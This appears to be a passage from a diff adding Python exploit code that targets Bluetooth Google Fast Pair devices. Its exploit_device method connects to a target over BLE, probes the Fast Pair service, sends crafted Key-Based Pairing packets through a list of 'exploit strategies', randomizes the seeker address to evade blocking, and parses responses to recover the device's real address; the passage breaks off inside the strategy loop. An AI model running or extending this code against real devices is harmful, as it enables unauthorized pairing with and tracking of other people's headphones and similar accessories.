@@ -1,0 +1,100 @@
+# --- Constants ---
+
+return fmt_mac(chunk)
+
+        return None
+
+    async def exploit_device(self, address, strategy_index=None, log_callback=None):
+        def log(msg, type="info"):
+            if log_callback: log_callback(msg, type)
+            else: print(msg)
+
+        log(f"Starting Multi-Strategy Exploit on {address}...", "info")
+
+        try:
+            async with BleakClient(address, timeout=20.0) as client:
+                log(f"Connected. Auth: {client.is_connected}", "success")
+
+                # Service Discovery
+                service = client.services.get_service(FAST_PAIR_UUID)
+                if not service:
+                    for s in client.services:
+                        if "fe2c" in str(s.uuid).lower():
+                            service = s
+                            break
+                if not service:
+                    log("Fast Pair Service not found.", "error")
+                    return False
+
+                # Model ID & Quirks
+                quirks = {"delay_before_kbp": 0, "delay_before_account_key": 0.5, "prefers_br_edr": True}
+                model_char = service.get_characteristic(MODEL_ID_UUID)
+                if model_char:
+                    try:
+                        mid_bytes = await client.read_gatt_char(model_char)
+                        quirks = self._parse_model_id(mid_bytes)
+                        log(f"Model ID: {mid_bytes.hex().upper()} (Quirks applied)", "info")
+                    except:
+                        log("Could not read Model ID, using defaults.", "info")
+
+                # KBP Characteristic
+                kbp_char = service.get_characteristic(KBP_CHAR_UUID)
+                if not kbp_char:
+                    log("KBP Characteristic not found.", "error")
+                    return False
+
+                # Apply Quirk Delay
+                if quirks["delay_before_kbp"] > 0:
+                    await asyncio.sleep(quirks["delay_before_kbp"])
+
+                # Response Handling
+                response_event = asyncio.Event()
+                parsed_address = None
+
+                def notification_handler(sender, data):
+                    nonlocal parsed_address
+                    # Use robust parser
+                    found = self._parse_kbp_response(data, current_secret)
+                    if found:
+                        parsed_address = found
+                        log(f"Response Parsed! Real Address: {parsed_address}", "success")
+                    else:
+                        log(f"Response received but could not parse MAC (len={len(data)})", "warning")
+
+                    response_event.set()
+
+                await client.start_notify(kbp_char, notification_handler)
+
+                # Strategy Selection
+                strategies_to_try = []
+                if strategy_index is not None:
+                    try:
+                        strategies_to_try.append(EXPLOIT_STRATEGIES[int(strategy_index)])
+                    except (ValueError, IndexError):
+                        log(f"Invalid strategy index: {strategy_index}. Available: {list(enumerate(EXPLOIT_STRATEGIES))}", "error")
+                        return False
+                else:
+                    strategies_to_try = EXPLOIT_STRATEGIES
+
+                # CRITICAL FIX: Use the actual target device address as the Provider Address
+                # The device checks this to ensure the packet is meant for it.
+                try:
+                    # Convert MAC string "AA:BB:..." to bytes
+                    provider_addr = bytes(int(x, 16) for x in address.split(":"))
+                except ValueError:
+                    log("Invalid MAC address format. Using dummy provider address.", "warning")
+                    provider_addr = bytes([0xAA, 0xBB, 0xCC, 0x11, 0x22, 0x33])
+
+                # Randomize Seeker Address for every attempt to evade caching/blocking
+                seeker_addr = secrets.token_bytes(6)
+                log(f"Target (Provider) Address: {address}", "info")
+                log(f"Strategies to try: {strategies_to_try}", "info")
+
+                success_strategy = None
+                current_secret = None
+                write_accepted_but_no_response = False
+
+                for strat in strategies_to_try:
+                    log(f"Trying Strategy: {strat}...", "info")
+                    packet, secret = self._build_kbp_packet(strat, provider_addr, seeker_addr)
+                    current_secret = secret # For notification handler
